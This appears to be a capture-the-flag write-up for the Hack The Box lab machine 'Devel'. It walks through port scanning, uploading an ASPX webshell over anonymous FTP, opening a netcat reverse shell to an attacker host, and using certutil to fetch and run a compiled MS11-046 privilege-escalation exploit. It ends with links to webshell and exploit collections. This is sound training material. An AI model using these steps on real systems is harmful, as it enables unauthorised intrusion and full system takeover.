# Devel 

**Links:** [1](https://www.hackthebox.com/machines/Devel)  [2](https://app.hackthebox.com/machines/Devel)

**Machine ip:** 10.10.10.5

![devel](https://github.com/h4md153v63n/CTFs/assets/5091265/9ab7e4a6-088a-4d20-88e1-5bc25641cfa1)


## Reconnaissance
```
sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.5 -e tun0 > ports

ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')

sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.5 --open
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/fd580f7a-f9d8-4301-9fd7-82b27bb870e8)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/346d5392-a21f-4dde-b88b-5d98570477a1)


## Enumeration
```
ftp anonymous@10.10.10.5

# or

ftp 10.10.10.5

Name (10.10.10.5:kali): anonymous
Password:

dir
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5149c861-836c-4c01-adf3-c5e5c3ad24d8)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/239327b2-ccb6-453a-9645-357665efbd90)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8f62462c-3a38-4713-85c3-4d48866cbec0)


## Exploitation & Gaining Access
Download, and transfer asp webshell using [cmd.aspx](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx).

**Alternatively**, use **msfvenom** [1](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/devel-writeup-w-o-metasploit#id-4ff1) [2](https://systemweakness.com/htb-devel-4a205fd1aa25)

```
# On the target machine with ftp connection:
put cmd.aspx

dir
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/cf0496fc-5036-426f-9943-52b96ec96bd1)

Navigate to "http://10.10.10.5/cmd.aspx", and get a webshell.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a37e66b5-b01c-4d6a-b2bb-bd8c4c0b464b)

Trigger the reverse shell:

```
# On the kali attack vm:
ls /usr/share/windows-binaries

smbserver.py tmp /usr/share/windows-binaries

nc -lnvp 4444

# On the webshell:
Program: \\10.10.14.24\tmp\nc.exe

Arguments: -e cmd.exe 10.10.14.24 4444

Run
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/34e2978a-e667-4b52-be83-934e27050b5a)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/78cf0d24-8148-458c-9b1d-bb9f20707968)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1f5378dd-6bf9-42f4-86ab-3d02c331d11b)


## Privilege Escalation

### Method 1: [**CVE-2011-1249**](https://www.exploit-db.com/exploits/40564) / MS11-046 - Manual Solution
```
# On the target machine:
systeminfo
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/89b2ddc2-3b53-41b6-9dc8-56745f3290dc)

Search  **windows 7 build 7600 x86 privilege escalation** on the internet.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5f6364c1-4f41-4730-be7a-50517bec0105)

Donwload, and try [**CVE-2011-1249**](https://www.exploit-db.com/exploits/40564).

```
# On the kali attack vm:
searchsploit ms11-046

searchsploit -m 40564

sed -n '60,70p' 40564.c
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ab0cef06-f654-4927-88ed-0cc94bdc4a2f)

```
# On the kali attack vm:
# Compile:
i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32

sudo python3 -m http.server

# On the target machine:
cd Users\Public\Downloads

certutil.exe -urlcache -split -f "http://10.10.14.24:8000/MS11-046.exe" MS11-046.exe

MS11-046.exe
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bdb02526-aad4-4391-86f4-7160e7e7ab36)


### Method 2: MS10-015 - Metasploit Solution
Try the solution [1](https://0xdf.gitlab.io/2019/03/05/htb-devel.html#privesc-alternative-with-metasploit)


# References & Alternatives
+ https://vvmlist.github.io/#devel
+ https://systemweakness.com/htb-devel-4a205fd1aa25
+ rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/devel-writeup-w-o-metasploit


## CVE Scripting
+ **CVE-2011-1249 / MS11–046 / afd.sys** https://www.exploit-db.com/exploits/40564
  + https://github.com/abatchy17/WindowsExploits/blob/5e9c25cda54fe33fb6e1fd3ae60512a1113b41df/MS11-046/40564.c


## Tools
+ **webshell / cmd.aspx:** https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx
  + https://github.com/nikicat/web-malware-collection/blob/master/Backdoors/ASP/cmd.aspx
  + https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/FuzzDB/cmd.aspx
  + /usr/share/davtest/backdoors/aspx_cmd.aspx
  + /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx
+ **msfvenom:** https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom
+ **nishang / Invoke-PowerShellTcp:** https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1


## Technical Knowledge
+ **Watson:** https://github.com/rasta-mouse/Watson
+ **WindowsExploits:** https://github.com/abatchy17/WindowsExploits
  + https://github.com/abatchy17/WindowsExploits/blob/5e9c25cda54fe33fb6e1fd3ae60512a1113b41df/MS11-046/40564.c


## Problems Solution
+ -


## For More
+ -
